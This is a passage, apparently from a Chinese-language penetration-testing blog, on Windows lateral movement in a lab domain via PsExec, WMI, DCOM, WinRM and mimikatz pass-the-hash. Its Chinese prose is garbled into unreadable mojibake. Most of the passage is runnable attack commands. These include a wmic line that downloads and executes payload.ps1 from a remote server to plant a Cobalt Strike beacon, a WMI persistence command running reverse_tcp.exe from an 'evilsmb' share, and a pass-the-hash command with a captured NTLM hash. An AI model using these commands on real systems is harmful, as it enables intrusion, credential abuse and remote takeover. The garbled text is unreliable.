‡ä¸»æœºå¼€å¯äº†é˜²ç«å¢™ï¼ˆé˜²ç«å¢™ç¦æ­¢445ç«¯å£è¿æ¥ï¼‰ï¼Œpsexecä¹Ÿæ˜¯ä¸èƒ½ä½¿ç”¨çš„ï¼Œä¼šæç¤ºæ‰¾ä¸åˆ°ç½‘ç»œè·¯å¾„ã€‚ç”±äºpsexecæ˜¯Windowsæä¾›çš„å·¥å…·ï¼Œæœ‰å¾®è½¯çš„ç­¾åï¼Œæ‰€ä»¥æ€è½¯å°†å…¶åˆ—åœ¨ç™½åå•ä¸­\nPsExec - Sysinternals | Microsoft Learn\nä½¿ç”¨æ¡ä»¶ å…·æœ‰æ­£ç¡®çš„å‡­è¯ï¼ˆå†…å­˜å‡­è¯ã€è´¦å·å¯†ç ã€è´¦å·NTLM Hashï¼‰\nèƒ½å»ºç«‹IPCé“¾æ¥ï¼ˆä¹Ÿå°±æ˜¯éœ€è¦é€šè¿‡smbè®¤è¯çš„ï¼‰ï¼Œä¸”ç›®æ ‡æœºå™¨å¼€å¯äº†å…±äº«ï¼ˆé»˜è®¤å¼€å¯çš„ï¼‰ï¼Œå¹¶ä¸”ç›®æ ‡å…±äº«ä¸­å¿…é¡»æœ‰admin$å…±äº«\nä½¿ç”¨ å¸¸ç”¨å‚æ•°ï¼š\npsexec \\\\ip -u administrator -p admin cmd # è¿›â¼ŠåŠäº¤äº’å¼shell PsExec -accepteula \\\\ip -s cmd.exe # å»ºç«‹äº¤äº’çš„shell psexec \\\\ip - uadministrator -p admin -w c:\\cmd # è¿›â¼Šäº¤äº’å¼shellï¼Œä¸”c:\\æ˜¯â½¬æ ‡æœºå™¨çš„â¼¯ä½œâ½¬å½• psexec \\\\ip -u administrator -p admin whoami all # æ‰§è¡Œå‘½ä»¤ psexec \\\\ip -u administrator -p admin -d c:\\beacon.exe # æ‰§è¡Œæ–‡ä»¶ psexec \\\\ip -u administrator -p admin -h -d c:\\beacon.exe UAC\t# çš„â½¤â¼¾æƒé™æ‰§è¡Œæ–‡ä»¶ åœºæ™¯ä¸­çš„ä½¿ç”¨ï¼š\nå»ºç«‹IPCè¿æ¥\nå¯åŠ¨psexecï¼š\nPsExec.exe -accepteula \\\\192.168.111.132 -u yuy0ung\\administrator -p Admin123456 -i cmd.exe\t# è¿”å›äº¤äº’shellï¼ˆè¿œç¨‹åˆ°æ¡Œé¢ï¼Œæˆ‘CSå’Œmsfä¸è¡Œï¼‰ psexec64.exe -accepteula \\\\192.168.111.137 -s ipconfig\t# è¿œç¨‹æ‰§è¡Œå‘½ä»¤ impacketå¥—ä»¶ä¸­çš„psexec.pyä¹Ÿå¯ä»¥å®ç°ï¼Œå…·ä½“å¯ä»¥å‚è€ƒæˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« impacketä½¿ç”¨æ€»ç»“\nWMIçš„åˆ©ç”¨ WMIæ˜¯Windowsåœ¨Powershellè¿˜æœªå‘å¸ƒå‰ï¼Œå¾®è½¯ç”¨æ¥ç®¡ç†Windowsç³»ç»Ÿçš„é‡è¦æ•°æ®åº“å·¥å…·ï¼ŒWMIæœ¬èº«çš„ç»„ç»‡æ¶æ„æ˜¯ä¸€ä¸ªæ•°æ®åº“æ¶æ„ï¼ŒWMI æœåŠ¡ä½¿ç”¨ DCOMæˆ– WinRM åè®®,è‡ªä» PsExec åœ¨å†…ç½‘ä¸­è¢«ä¸¥æ ¼ç›‘æ§åï¼Œè¶Šæ¥è¶Šå¤šçš„åç—…æ¯’å‚å•†å°† PsExec åŠ å…¥äº†é»‘åå•ï¼Œäºæ˜¯é»‘å®¢ä»¬æ¸æ¸å¼€å§‹ä½¿ç”¨ WMI è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚é€šè¿‡æ¸—é€æµ‹è¯•å‘ç°ï¼Œåœ¨ä½¿ç”¨ wmiexec è¿›è¡Œæ¨ªå‘ç§»åŠ¨æ—¶ï¼Œwindows æ“ä½œç³»ç»Ÿé»˜è®¤ä¸ä¼šå°† WMI çš„æ“ä½œè®°å½•åœ¨æ—¥å¿—ä¸­ã€‚å› æ­¤å¾ˆå¤š APT å¼€å§‹ä½¿ç”¨ WMI è¿›è¡Œæ”»å‡»\nå¸¸è§„åˆ©ç”¨æ–¹æ³• å¯ä»¥é€šè¿‡wmic.exeå’Œpowershell cmdletæ¥ä½¿ç”¨WMIæ•°æ®å’Œæ‰§è¡ŒWMIæ–¹æ³•\næ‰§è¡Œè¿œç¨‹æŸ¥è¯¢\næŸ¥è¯¢è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹ä¿¡æ¯ï¼š\nwmic /node:192.168.111.137 /user:yuy0ung\\administrator /password:Admin123456 process list brief åˆ›å»ºè¿œç¨‹è¿›ç¨‹ è°ƒç”¨Win32_process.Createæ–¹æ³•åœ¨è¿œç¨‹ä¸»æœºä¸Šåˆ›å»ºè¿›ç¨‹ï¼Œå¯åŠ¨cmdæ‰§è¡Œå‘½ä»¤ï¼Œwmicæ‰§è¡Œå‘½ä»¤æ—¶æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦å°†æ‰§è¡Œç»“æœå†™å…¥æ–‡ä»¶ï¼Œé€šè¿‡å»ºç«‹å…±äº«è¿æ¥ç­‰æ–¹å¼ä½¿ç”¨typeå‘½ä»¤è¿œç¨‹è¯»å–ï¼š\nwmic /node:192.168.111.137 /user:yuy0ung\\administrator /password:Admin123456 process call create \u0026#34;cmd.exe /c ipconfig \u0026gt; C:\\result.txt\u0026#34; ä¸Šçº¿CS ç”Ÿæˆpowershellè„šæœ¬ï¼š\nwmicè¿›è¡Œä¸Šçº¿ï¼ŒæŠŠps1æ”¾åˆ°å…¬ç½‘vpsï¼Œå¯ä»¥ä½¿ç”¨pythonå¼€å¯httpæœåŠ¡æä¾›ä¸‹è½½\nwmic /NODE:192.168.111.137 /user:yuy0ung\\administrator /password:Admin123456 PROCESS call create \u0026#34;powershell.exe -nop -w hidden -c \\\u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;http://192.168.205.150:8000/payload.ps1\u0026#39;))\\\u0026#34;\u0026#34; æˆåŠŸä¸Šçº¿CS\nå¸¸è§åˆ©ç”¨å·¥å…· wmiexec æ¥è‡ªimpacketå¥—ä»¶ï¼Œä¸€ä¸ªæ—¢æœ‰å…¨äº¤äº’ä¹Ÿæœ‰åŠäº¤äº’çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œå·¥å…·ï¼Œé€šè¿‡wmiåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œè¯¥å·¥å…·éœ€è¦å¼€å¯135å’Œ445ç«¯å£ï¼Œ445ç«¯å£ç”¨äºä¼ è¾“å‘½ä»¤æ‰§è¡Œçš„å›æ˜¾\nimpacket-wmiexec yuy0ung/administrator:Admin123456@192.168.111.137 å› ä¸ºkaliå‡ºäº†ç‚¹å°é—®é¢˜ï¼Œæˆ‘å°†pyè„šæœ¬æ‰“åŒ…æˆexeåœ¨windowsä¸Šè¿è¡Œï¼š\npip install pyinstaller -i https://mirrors.aliyun.com/pypi/simple ç„¶åè¿è¡Œï¼š\nwmiexec.exe yuy0ung/administrator:Admin123456@192.168.111.137 Invoke-WmiCommand è¯¥é¡¹ç›®æºäºpowerspolitï¼Œå¯ä»¥é€šè¿‡powershellè¿œç¨‹è°ƒç”¨wmiæ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸å…·ä½“è®°å½•äº†\nWMIäº‹ä»¶è®¢é˜…çš„åˆ©ç”¨ è¿œç¨‹éƒ¨ç½²WMIäº‹ä»¶è®¢é˜…éœ€è¦åœ¨è¿œç¨‹ç³»ç»Ÿä¸Šå…·æœ‰ç®¡ç†å‘˜æƒé™ï¼ŒWMIäº‹ä»¶è®¢é˜…ç”¨åˆ°çš„ä¸¤ä¸ªç»„ä»¶event,consumer\nEvent Filter:\nWQLäº‹ä»¶æŸ¥è¯¢ï¼Œç”¨äºå°†äº‹ä»¶ç­›é€‰ä¸ºç‰¹å®šæ¡ä»¶é›†ã€‚WQLæŸ¥è¯¢å¯èƒ½ç±»ä¼¼äº\nSelect * From __InstanceCreationEvent Within 5 Where TargetInstance Isa â€œWin32_Processâ€ AND TargetInstance.Name = \u0026#34;winlog.exe\u0026#34; ç±»ä¼¼äºæŸ¥è¯¢æŸä¸ªè¿›ç¨‹çš„åˆ›å»ºæˆ–æŸä¸ªå‘½ä»¤çš„æ‰§è¡Œï¼Œå½“æŸ¥è¯¢åˆ°å¯¹åº”è¿›ç¨‹åˆ›å»ºæ—¶ï¼Œå°±ä¼šè°ƒç”¨consumer\näº‹ä»¶æ¶ˆè´¹è€…ï¼ˆEvent Consumerï¼‰ï¼šè¿™æ˜¯äº‹ä»¶è§¦å‘æ—¶æˆ‘ä»¬æƒ³è¦è¿›è¡Œçš„ç‰¹å®šæ“ä½œï¼Œä½¿ç”¨äº‹ä»¶æ¶ˆè´¹ç±»çš„ActiveScriptEventConsumerå’ŒCommandLineEventConsumerï¼Œå…¶ä¸­ï¼ŒActiveScriptEventConsumerå…è®¸æ‰§è¡Œè„šæœ¬ä»£ç ï¼ˆæ¥è‡ªJScriptæˆ–VBScriptå¼•æ“ï¼‰ï¼Œè€ŒCommandLineEventConsumerç±»åˆ™å…è®¸è¿è¡Œä»»æ„å‘½ä»¤ï¼Œæ›´æ¨èActiveScriptEventConsumerç±»ï¼Œè¿™æ ·å¯ä»¥é¿å…è§¦åŠLOLBinçš„é›·åŒº\nhttps://www.anquanke.com/post/id/223232\nç­›é€‰å™¨ä¸æ¶ˆè´¹è€…æ€»æ˜¯ç»‘å®šåœ¨ä¸€èµ·çš„ï¼Œå½“ç­›é€‰å™¨è½®è¯¢åˆ°å¯¹åº”è¿›ç¨‹å¯åŠ¨æ—¶ï¼Œå°†ä¼šè°ƒç”¨æ¶ˆè´¹è€…æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæˆ–æ˜¯æ‰§è¡Œè„šæœ¬æ–‡ä»¶ç­‰\nä¸éš¾çœ‹å‡ºè¯¥æ–¹æ³•æ›´é€‚ç”¨äºæƒé™æŒä¹…åŒ–ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥è¿›è¡Œæ— æ–‡ä»¶çš„æ¨ªå‘ç§»åŠ¨\nSharp_WMIEvent é¡¹ç›®åœ°å€ï¼šhttps://github.com/wh0amitz/Sharp-WMIEvent\nSharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -Computername 192.168.30.10 -Domain hack.com -Username yuy0ung\\administrator -Password Admin123456 -Command \u0026#34;cmd.exe /c \\\\192.168.111.173\\smb\\Sharp-WMIEvent.exe\u0026#34; #Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -Command \u0026#34;cmd.exe /c \\\\IP\\evilsmb\\reverse_tcp.exe\u0026#34; -FilterName \u0026lt;Filter Name\u0026gt; -ConsumerName \u0026lt;Consumer Name\u0026gt; åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ°¸ä¹…æ€§çš„WMIè®¢é˜…äº‹ä»¶ï¼Œæ¯60ç§’æ‰§è¡Œä¸€æ¬¡\nDCOMçš„åˆ©ç”¨ DCOMä»‹ç» DCOMï¼ˆåˆ†å¸ƒå¼ç»„ä»¶å¯¹è±¡æ¨¡å‹ï¼‰æ˜¯å¾®è½¯çš„ä¸€ç³»åˆ—æ¦‚å¿µå’Œç¨‹åºæ¥å£ã€‚å®ƒæ”¯æŒä¸åŒçš„ä¸¤å°æœºå™¨ä¸Šçš„ç»„ä»¶é—´çš„é€šä¿¡ï¼Œä¸è®ºå®ƒä»¬æ˜¯è¿è¡Œåœ¨å±€åŸŸç½‘ã€å¹¿åŸŸç½‘ã€è¿˜æ˜¯Internetä¸Šã€‚åˆ©ç”¨è¿™ä¸ªæ¥å£ï¼Œå®¢æˆ·ç«¯ç¨‹åºå¯¹è±¡èƒ½å¤Ÿå‘ç½‘ç»œä¸­å¦ä¸€å°è®¡ç®—æœºä¸Šçš„æœåŠ¡å™¨ç¨‹åºå¯¹è±¡å‘é€è¯·æ±‚ï¼Œä½¿ç”¨DCOMè¿›è¡Œæ¨ªå‘ç§»åŠ¨çš„ä¼˜åŠ¿ä¹‹ä¸€åœ¨äºï¼Œåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œçš„è¿›ç¨‹å°†ä¼šæ˜¯æ‰˜ç®¡COMæœåŠ¡å™¨ç«¯çš„è½¯ä»¶\nä½¿ç”¨DCOMæ¨ªå‘ç§»åŠ¨ è·å–DCOMåˆ—è¡¨ Get-CimInstance Win32_DCOMApplication Get-CimInstance -class Win32_DCOMApplication | select appid,name Get-WmiObject -Namespace ROOT\\CIMV2 -Class Win32_DCOMApplication DCOMæ¨ªå‘ç§»åŠ¨å‰æ éœ€è¦å…³é—­ç³»ç»Ÿé˜²ç«å¢™ å¿…é¡»æ‹¥æœ‰ç®¡ç†å‘˜æƒé™ åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤æ—¶ï¼Œå¿…é¡»ä½¿ç”¨åŸŸç®¡çš„administratorè´¦æˆ·æˆ–è€…ç›®æ ‡ä¸»æœºå…·æœ‰ç®¡ç†å‘˜æƒé™çš„è´¦æˆ· åˆ©ç”¨ åˆ©ç”¨DCOMä¸­çš„ä¸€äº›ç»„ä»¶å¯ä»¥å®ç°è¿œç¨‹æ‰§è¡Œå‘½ä»¤\nMMC20.Application\né¦–å…ˆæœ¬åœ°å®éªŒä¸€ä¸‹å‘½ä»¤æ‰§è¡Œï¼š\né€šè¿‡PowerShellä¸DCOMè¿›è¡Œè¿œç¨‹äº¤äº’ï¼Œæä¾›ä¸€ä¸ªDCOM ProgIDå’Œä¸€ä¸ªIPåœ°å€ï¼Œå³å¯è¿œç¨‹è¿”å›ä¸€ä¸ªCOMå¯¹è±¡çš„å®ä¾‹\n$com = [activator]::CreateInstance([type]::GetTypeFromProgID(\u0026#34;MMC20.Application\u0026#34;,\u0026#34;127.0.0.1\u0026#34;)) è°ƒç”¨\u0026quot;ExecuteShellCommand\u0026quot;æ–¹æ³•åœ¨è¿œç¨‹ä¸»æœºä¸Šå¯åŠ¨è¿›ç¨‹\n$com.Document.ActiveView.ExecuteShellCommand(\u0026#39;cmd.exe\u0026#39;,$null,\u0026#34;/c calc.exe\u0026#34;,\u0026#34;Minimzed\u0026#34;) æˆåŠŸæ‰§è¡Œå‘½ä»¤\nè¿œç¨‹ä¸Šçº¿åŒç†ï¼Œä½†éœ€è¦è‡ªèº«ç®¡ç†å‘˜è´¦æˆ·RIDä¸º500ï¼Œå¦åˆ™ä¼šè¢«UAC\næ­¤å¤–è¿˜æœ‰shellwindowså’Œshellbrowserwindowsç»„ä»¶èƒ½å¤Ÿå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œè¯»è€…å¯ä»¥è‡ªè¡Œäº†è§£\ndcomexecçš„ä½¿ç”¨ impacketå¥—ä»¶çš„dcomexec.pyä¹Ÿå¯ä»¥å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆåŒæ ·éœ€è¦ç®¡ç†å‘˜è´¦æˆ·RIDä¸º500ï¼‰ï¼š\ndcomexec.exe [domain/]username:password@ip //åˆ›å»ºä¸€ä¸ªäº¤äº’å¼shell dcomexec.exe [domain/]username:password@ip command // æ‰§è¡Œå‘½ä»¤ dcomexec.exe [domain/]username:@ip -hashes [hash] //hashä¼ é€’ è¯¦ç»†ä½¿ç”¨ä¹Ÿå¯è§æˆ‘impacketçš„æ–‡ç« impacketçš„ä½¿ç”¨\nWinRMçš„åˆ©ç”¨ WinRMï¼ˆWindowsè¿œç¨‹ç®¡ç†ï¼‰æ˜¯Microsoft åœ¨Windowsä¸­å¯¹WS-Managementçš„å®ç°ï¼Œå®ƒä½¿ç³»ç»Ÿå¯ä»¥è·¨é€šç”¨ç½‘ç»œè®¿é—®æˆ–äº¤æ¢ç®¡ç†ä¿¡æ¯ã€‚åˆ©ç”¨è„šæœ¬å¯¹è±¡æˆ–å†…ç½®çš„å‘½ä»¤è¡Œå·¥å…·ï¼ŒWinRMå¯ä»¥ä¸å¯èƒ½å…·æœ‰åŸºæ¿ç®¡ç†æ§åˆ¶å™¨ï¼ˆBMCï¼‰çš„ä»»ä½•è¿œç¨‹è®¡ç®—æœºä¸€èµ·ä½¿ç”¨ï¼Œä»¥è·å–æ•°æ®ã€‚ä¹Ÿå¯ä»¥è·å–åŸºäºWindowsçš„è®¡ç®—æœºï¼ˆåŒ…æ‹¬WinRMï¼‰ï¼ŒWinRMé»˜è®¤ç«¯å£5985ï¼ˆHTTPç«¯å£ï¼‰æˆ–5986ï¼ˆHTTPSç«¯å£ï¼‰ï¼Œè‹¥é…ç½®äº†WINRMè¿œç¨‹æœåŠ¡ï¼Œå½“æˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿œç¨‹è¿æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œæ“ä½œ\nwinrs.exe Winrs.exe æ˜¯ä¸€ä¸ªå†…ç½®çš„å‘½ä»¤è¡Œå·¥å…·,å®ƒå…è®¸è¿œç¨‹å‘½ä»¤çš„æ‰§è¡Œåœ¨WinRmçš„é€‚å½“çš„æœ‰èµ„æ ¼çš„ç”¨æˆ·\nwinrs -r:http://127.0.0.1:5985 -u:administrator -p:Admin@123 \u0026#34;whoami\u0026#34; winrs -r:http://127.0.0.1:5985 -u:æœºå™¨å\\ç”¨æˆ·å -p:xxxxx \u0026#34;ipconfig\u0026#34; winrs -r:https://127.0.0.1:5985 -u:æœºå™¨å\\ç”¨æˆ·å -p:xxxxx \u0026#34;ipconfig\u0026#34; winrs -r:http://127.0.0.1:5985 -u:æœºå™¨å\\ç”¨æˆ·å -p:xxxxx cmd winrs -r:https://127.0.0.1:5985 -u:æœºå™¨å\\ç”¨æˆ·å -p:xxxxx cmd Invoke-Command -ComputerName TARGET -ScriptBlock { dir c:\\ } Invoke-Command -ComputerName TARGET -Credential åŸŸå\\ç”¨æˆ·å -command {Get-Culture} Invoke-Command -ComputerName TARGET -Credential åŸŸå\\ç”¨æˆ·å -ScriptBlock {GetCulture} 1ã€æ‰§è¡Œ\nwinrs -r:http://127.0.0.1:5985 -u:administrator -p:Admin@123 \u0026#34;whoami\u0026#34; winrs -r:http://127.0.0.1:5985 -u:æœºå™¨å\\ç”¨æˆ·å -p:xxxxx \u0026#34;ipconfig\u0026#34; winrs -r:https://127.0.0.1:5985 -u:æœºå™¨å\\ç”¨æˆ·å -p:xxxxx \u0026#34;ipconfig\u0026#34; winrs -r:http://127.0.0.1:5985 -u:æœºå™¨å\\ç”¨æˆ·å -p:xxxxx cmd winrs -r:https://127.0.0.1:5985 -u:æœºå™¨å\\ç”¨æˆ·å -p:xxxxx cmd Invoke-Command -ComputerName TARGET -ScriptBlock { dir c:\\ } Invoke-Command -ComputerName TARGET -Credential åŸŸå\\ç”¨æˆ·å -command {Get-Culture} Invoke-Command -ComputerName TARGET -Credential åŸŸå\\ç”¨æˆ·å -ScriptBlock {GetCulture} å¦‚æœå‡ºç°\nWinrs error:WinRM å®¢æˆ·ç«¯æ— æ³•å¤„ç†è¯¥è¯·æ±‚ã€‚ å¯ä»¥åœ¨ä¸‹åˆ—æ¡ä»¶ä¸‹å°†é»˜è®¤èº«ä»½éªŒè¯ä¸ IP åœ°å€ç»“åˆä½¿ç”¨: ä¼ è¾“ä¸º HTTPS æˆ–ç›®æ ‡ä½äº TrustedHosts åˆ—è¡¨ä¸­ï¼Œå¹¶ä¸”æä¾›äº†æ˜¾å¼å‡­æ®ã€‚ ä½¿ç”¨ winrm.cmd é…ç½® TrustedHostsã€‚è¯·æ³¨æ„ï¼ŒTrustedHosts åˆ—è¡¨ä¸­çš„è®¡ç®—æœºå¯èƒ½æœªç»è¿‡èº«ä»½éªŒè¯ã€‚ æœ‰å…³å¦‚ä½•è®¾ç½® TrustedHosts çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·è¿è¡Œä»¥ä¸‹å‘½ä»¤ è¾“å…¥winrm set winrm/config/Client @{TrustedHosts=\u0026quot;*\u0026quot;}å³å¯\nå“ˆå¸Œä¼ é€’æ”»å‡» PTHå³å“ˆå¸Œä¼ é€’(Pass The Hash)æ”»å‡»ï¼Œè¯¥æ–¹æ³•é€šè¿‡æ‰¾åˆ°ä¸è´¦æˆ·ç›¸å…³çš„å¯†ç æ•£åˆ—å€¼(é€šå¸¸æ˜¯ NTLM Hash)æ¥è¿›è¡Œæ”»å‡»ã€‚åœ¨åŸŸç¯å¢ƒä¸­ï¼Œç”¨æˆ·ç™»å½•è®¡ç®—æœºæ—¶ä½¿ç”¨çš„å¤§éƒ½æ˜¯åŸŸè´¦å·ï¼Œå¤§é‡è®¡ç®—æœºåœ¨å®‰è£…æ—¶ä¼šä½¿ç”¨ç›¸åŒçš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ï¼Œå› æ­¤ï¼Œå¦‚æœè®¡ç®—æœºçš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œæ”»å‡»è€…å°±èƒ½ä½¿ç”¨å“ˆå¸Œä¼ é€’æ”»å‡»çš„æ–¹æ³•ç™»å½•å†…ç½‘ä¸­çš„å…¶ä»–è®¡ç®—æœºã€‚åŒæ—¶ï¼Œé€šè¿‡å“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œæ”»å‡»è€…ä¸éœ€è¦èŠ±æ—¶é—´ç ´è§£å¯†ç æ•£åˆ—å€¼(è¿›è€Œè·å¾—å¯†ç æ˜æ–‡)ã€‚ åœ¨Windowsç½‘ç»œä¸­ï¼Œæ•£åˆ—å€¼å°±æ˜¯ç”¨æ¥è¯æ˜èº«ä»½çš„(æœ‰æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç æ•£åˆ—å€¼ï¼Œå°±èƒ½é€šè¿‡éªŒè¯)ï¼Œè€Œå¾®è½¯è‡ªå·±çš„äº§å“å’Œå·¥å…·æ˜¾ç„¶ä¸ä¼šæ”¯æŒè¿™ç§æ”»å‡»ï¼Œäºæ˜¯ï¼Œæ”»å‡»è€…å¾€å¾€ä¼šä½¿ç”¨ç¬¬ä¸‰æ–¹å·¥å…·æ¥å®Œæˆä»»åŠ¡ã€‚åœ¨ WindowsServer 2012 R2åŠä¹‹åç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿä¸­ï¼Œé»˜è®¤åœ¨å†…å­˜ä¸­ä¸ä¼šè®°å½•æ˜æ–‡å¯†ç ï¼Œå› æ­¤ï¼Œæ”»å‡»è€…å¾€å¾€ä¼šä½¿ç”¨å·¥å…·å°†æ•£åˆ—å€¼ä¼ é€’åˆ°å…¶ä»–è®¡ç®—æœºä¸­ï¼Œè¿›è¡Œæƒé™éªŒè¯ï¼Œå®ç°å¯¹è¿œç¨‹è®¡ç®—æœºçš„æ§åˆ¶\nå¸Œä¼ é€’æ”»å‡»åŸç† å½“ç”¨æˆ·éœ€è¦ç™»å½•æŸç½‘ç«™æ—¶ï¼Œå¦‚æœè¯¥ç½‘ç«™ä½¿ç”¨æ˜æ–‡çš„æ–¹å¼ä¿å­˜ç”¨æˆ·çš„å¯†ç ï¼Œé‚£ä¹ˆï¼Œä¸€æ—¦è¯¥ç½‘ç«™å‡ºç°å®‰å…¨æ¼æ´ï¼Œæ‰€æœ‰ç”¨æˆ·çš„æ˜æ–‡å¯†ç å‡ä¼šè¢«æ³„éœ²ã€‚ç”±æ­¤ï¼Œäº§ç”Ÿäº†æ•£åˆ—å€¼çš„æ¦‚å¿µã€‚å½“ç”¨æˆ·è®¾ç½®å¯†ç æ—¶ï¼Œç½‘ç«™æœåŠ¡å™¨ä¼šå¯¹ç”¨æˆ·è¾“å…¥çš„å¯†ç è¿›è¡Œæ•£åˆ—åŠ å¯†å¤„ç†(é€šå¸¸ä½¿ç”¨MD5ç®—æ³•)æ•£åˆ—åŠ å¯†ç®—æ³•èˆ¬ä¸ºå•å‘ä¸å¯é€†ç®—æ³•ã€‚å½“ç”¨æˆ·ç™»å½•ç½‘ç«™æ—¶ï¼Œä¼šå…ˆå¯¹ç”¨æˆ·è¾“å…¥çš„å¯†ç è¿›è¡Œæ•£åˆ—åŠ å¯†å¤„ç†ï¼Œå†ä¸æ•°æ® åº“ä¸­å­˜å‚¨çš„æ•£åˆ—å€¼è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœå®Œå…¨ç›¸åŒåˆ™è¡¨ç¤ºéªŒè¯æˆåŠŸã€‚ ä¸»æµçš„Windowsæ“ä½œç³»ç»Ÿï¼Œé€šå¸¸ä¼šä½¿ç”¨ NTLM Hashå¯¹è®¿é—®èµ„æºçš„ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚æ—©æœŸç‰ˆæœ¬çš„ Windowsæ“ä½œç³»ç»Ÿï¼Œåˆ™ä½¿ç”¨ LMHashå¯¹ç”¨æˆ·å¯†ç è¿›è¡ŒéªŒè¯ã€‚ä½†æ˜¯ï¼Œå½“å¯†ç å¤§äºç­‰äº14ä½ æ—¶ï¼Œå°±æ— æ³•ä½¿ç”¨ LM Hashäº†ã€‚ä» Windows vistaå’Œ Windowsserver2008ç‰ˆæœ¬å¼€å§‹ï¼Œ Windowsæ“ä½œç³»ç»Ÿé»˜è®¤ç¦ç”¨ LMHashï¼Œå› ä¸ºåœ¨ä½¿ç”¨ NTLM Hashè¿›è¡Œèº«ä»½è®¤è¯æ—¶ï¼Œä¸ä¼šä½¿ç”¨æ˜æ–‡å£ä»¤ï¼Œè€Œæ˜¯å°†æ˜æ–‡å£ä»¤é€šè¿‡ç³»ç»ŸAPI(ä¾‹å¦‚Lsalogon User)è½¬æ¢æˆæ•£åˆ—å€¼ã€‚ä¸è¿‡ï¼Œæ”»å‡»è€…åœ¨è·å¾—å¯†ç æ•£åˆ—å€¼ä¹‹åï¼Œä¾æ—§å¯ä»¥ä½¿ç”¨å“ˆå¸Œä¼ é€’æ”»å‡»æ¥æ¨¡æ‹Ÿç”¨æˆ·è¿›è¡Œè®¤è¯ã€‚\nå“ˆå¸Œä¼ é€’æ¡ä»¶ å“ˆå¸Œä¼ é€’æ”»å‡»çš„å‰æï¼šæœ‰ç®¡ç†å‘˜çš„ NTLM Hash ï¼Œå¹¶ä¸”ç›®æ ‡æœºå™¨å¼€æ”¾445ç«¯å£\nWindows Vista ä¹‹å‰çš„æœºå™¨ï¼Œå¯ä»¥ä½¿ç”¨æœ¬åœ°ç®¡ç†å‘˜ç»„å†…ç”¨æˆ·è¿›è¡Œæ”»å‡»\nWindows Vista ä¹‹åçš„æœºå™¨ï¼Œåªèƒ½æ˜¯administrator(SIDä¸º500)ç”¨æˆ·çš„å“ˆå¸Œå€¼æ‰èƒ½è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œå…¶ä»–ç”¨æˆ·(åŒ…æ‹¬ç®¡ç†å‘˜ç”¨æˆ·ä½†æ˜¯éadministrator)ä¹Ÿä¸èƒ½ä½¿ç”¨å“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œä¼šæç¤ºæ‹’ç»è®¿é—®\nåœ¨å·¥ä½œç»„ç¯å¢ƒä¸­ï¼š Windows Vista ä¹‹å‰çš„æœºå™¨ï¼Œå¯ä»¥ä½¿ç”¨æœ¬åœ°ç®¡ç†å‘˜ç»„å†…ç”¨æˆ·è¿›è¡Œæ”»å‡»ã€‚ Windows Vista ä¹‹åçš„æœºå™¨ï¼Œåªèƒ½æ˜¯administratorç”¨æˆ·çš„å“ˆå¸Œå€¼æ‰èƒ½è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œå…¶ä»–ç”¨æˆ·(åŒ…æ‹¬ç®¡ç†å‘˜ç”¨æˆ·ä½†æ˜¯éadministrator)ä¹Ÿä¸èƒ½ä½¿ç”¨å“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œä¼šæç¤ºæ‹’ç»è®¿é—®ã€‚\nåœ¨åŸŸç¯å¢ƒä¸­ï¼š åªèƒ½æ˜¯åŸŸç®¡ç†å‘˜ç»„å†…ç”¨æˆ·(å¯ä»¥æ˜¯åŸŸç®¡ç†å‘˜ç»„å†…éadministratorç”¨æˆ·)çš„å“ˆå¸Œå€¼æ‰èƒ½è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œæ”»å‡»æˆåŠŸåï¼Œå¯ä»¥è®¿é—®åŸŸå†…ä»»ä½•ä¸€å°æœºå™¨\nåˆ©ç”¨ mimikatz mimikatzå†…ç½®äº†PTHåŠŸèƒ½ï¼Œéœ€è¦æœ¬åœ°ç®¡ç†å‘˜æƒé™\nç”¨æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·æŠ“å–åˆ°äº†åŸŸç®¡ç†å‘˜å¯†ç çš„htlm hashae4c0d5fb959fda8f4cb1d14a8376af4ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œå“ˆå¸Œä¼ é€’ï¼š\nmimikatz.exe \u0026#34;privilege::debug\u0026#34; \u0026#34;sekurlsa::pth /user:yuy0ung\\administrator /domain:yuy0ung.com /ntlm:ae4c0d5fb959fda8f4cb1d14a8376af4 impacket 